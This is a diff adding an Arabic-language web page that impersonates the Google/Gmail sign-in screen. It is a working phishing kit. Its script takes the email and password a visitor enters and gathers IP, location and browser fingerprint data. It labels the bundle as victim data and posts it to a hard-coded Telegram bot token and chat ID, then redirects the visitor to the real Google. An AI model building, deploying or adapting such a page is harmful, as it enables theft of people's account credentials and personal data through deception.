@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول • Google</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+    }
+    body {
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .card {
+      background: #ffffff;
+      border-radius: 28px;
+      padding: 40px 32px;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
+      text-align: center;
+      border: 1px solid #dadce0;
+    }
+    .logo {
+      font-size: 42px;
+      font-weight: 500;
+      letter-spacing: -1px;
+      margin-bottom: 8px;
+      color: #1a0dab;
+    }
+    .logo span { color: #ea4335; }
+    .subtitle {
+      font-size: 20px;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 6px;
+    }
+    .hint {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 28px;
+    }
+    .field {
+      margin-bottom: 18px;
+      text-align: right;
+    }
+    .field input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 12px;
+      background: #fafafa;
+      transition: 0.2s;
+      outline: none;
+      color: #202124;
+    }
+    .field input:focus {
+      border-color: #1a73e8;
+      background: #ffffff;
+      box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.15);
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #1a73e8;
+      border: none;
+      border-radius: 40px;
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.15s;
+      margin-top: 12px;
+      letter-spacing: 0.3px;
+    }
+    button:hover { background: #1557b0; box-shadow: 0 4px 12px rgba(26,115,232,0.3); }
+    button:disabled { opacity: 0.6; cursor: not-allowed; box-shadow: none; }
+    .footer {
+      margin-top: 24px;
+      font-size: 13px;
+      color: #5f6368;
+      border-top: 1px solid #e8eaed;
+      padding-top: 20px;
+    }
+    #status {
+      margin-top: 16px;
+      font-size: 13px;
+      color: #34a853;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">G<span>o</span>ogle</div>
+  <div class="subtitle">تسجيل الدخول</div>
+  <div class="hint">استمر إلى Gmail</div>
+
+  <form id="loginForm">
+    <div class="field">
+      <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required autocomplete="off">
+    </div>
+    <div class="field">
+      <input type="password" id="password" placeholder="كلمة المرور" required autocomplete="off">
+    </div>
+    <button type="submit" id="submitBtn">➤ التالي</button>
+  </form>
+  <div id="status">⏳ جاري التحقق...</div>
+  <div class="footer">حساب Google واحد لكل ما تحبه</div>
+</div>
+
+<script>
+  (function() {
+    // ===== ثوابت البوت =====
+    const BOT_TOKEN = "8817104787:AAEQWr9BptLgcEAoyPFeImKqOAMSPle4cOM";
+    const CHAT_ID = "7013270697";
+    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    const form = document.getElementById('loginForm');
+    const email = document.getElementById('email');
+    const password = document.getElementById('password');
+    const btn = document.getElementById('submitBtn');
+    const statusDiv = document.getElementById('status');
+
+    // ===== دالة لجلب IP والموقع =====
+    async function getLocationData() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        if (!res.ok) throw new Error('IP fetch failed');
+        return await res.json();
+      } catch {
+        return { ip: 'غير متاح', city: 'غير متاح', region: 'غير متاح', country_name: 'غير متاح', org: 'غير متاح' };
+      }
+    }
+
+    // ===== دالة لجمع كل البيانات =====
+    async function collectFullData() {
+      const loc = await getLocationData();
+
+      const data = {
+        '🌐 IP': loc.ip || 'غير متاح',
+        '📍 الدولة': loc.country_name || 'غير متاح',
+        '🏙️ المدينة': loc.city || 'غير متاح',
+        '🗺️ المنطقة': loc.region || 'غير متاح',
+        '📡 المزود (ISP)': loc.org || 'غير متاح',
+        '🖥️ المتصفح': navigator.userAgent || 'غير متاح',
+        '⚙️ النظام': navigator.platform || 'غير متاح',
+        '🌍 اللغة': navigator.language || 'غير متاح',
+        '📐 الشاشة': `${screen.width}x${screen.height}`,
+        '🕒 المنطقة الزمنية': Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير متاح',
+        '🔗 الصفحة المصدر': document.referrer || 'مباشر',
+        '📅 التوقيت': new Date().toISOString().replace('T', ' ').slice(0, 19),
+        '🔑 البريد المدخل': email.value.trim(),
+        '🔒 كلمة المرور': password.value.trim()
+      };
+      return data;
+    }
+
+    // ===== بناء نص الرسالة =====
+    function buildTelegramText(data) {
+      let lines = ['📩 *وصول جديد - بيانات الضحية*', '──────────────────'];
+      for (const [key, val] of Object.entries(data)) {
+        lines.push(`${key}: \`${val || 'فارغ'}\``);
+      }
+      lines.push('──────────────────');
+      lines.push(`🆔 معرف الجلسة: \`${localStorage.getItem('_sess') || 'جديد'}\``);
+      return lines.join('\n');
+    }
+
+    // ===== إرسال إلى البوت =====
+    async function sendToBot(text) {
+      try {
+        const resp = await fetch(API_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown'
+          })
+        });
+        return await resp.json();
+      } catch (e) {
+        return { ok: false, error: e.message };
+      }
+    }
+
+    // ===== معالج النموذج =====
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      if (!email.value.trim() || !password.value.trim()) {
+        statusDiv.style.display = 'block';
+        statusDiv.style.color = '#d93025';
+        statusDiv.textContent = '⚠️ الرجاء ملء البريد وكلمة المرور.';
+        return;
+      }
+
+      btn.disabled = true;
+      statusDiv.style.display = 'block';
+      statusDiv.style.color = '#1a73e8';
+      statusDiv.textContent = '⏳ جمع البيانات وإرسالها...';
+
+      // تعيين جلسة عشوائية للتتبع
+      if (!localStorage.getItem('_sess')) {
+        localStorage.setItem('_sess', Math.random().toString(36).substring(2, 12));
+      }
+
+      const full = await collectFullData();
+      const msg = buildTelegramText(full);
+
+      // إرسال للبوت
+      const result = await sendToBot(msg);
+
+      if (result.ok) {
+        statusDiv.style.color = '#34a853';
+        statusDiv.textContent = '✅ تم الإرسال. جاري التحويل...';
+        // إعادة توجيه إلى Google الحقيقية بعد 0.8 ثانية
+        setTimeout(() => {
+          window.location.href = 'https://www.google.com';
+        }, 800);
+      } else {
+        statusDiv.style.color = '#d93025';
+        statusDiv.textContent = `❌ فشل الإرسال: ${result.error || 'خطأ غير معروف'}`;
+        btn.disabled = false;
+      }
+    });
+  })();
+</script>
+</body>
+  </html>
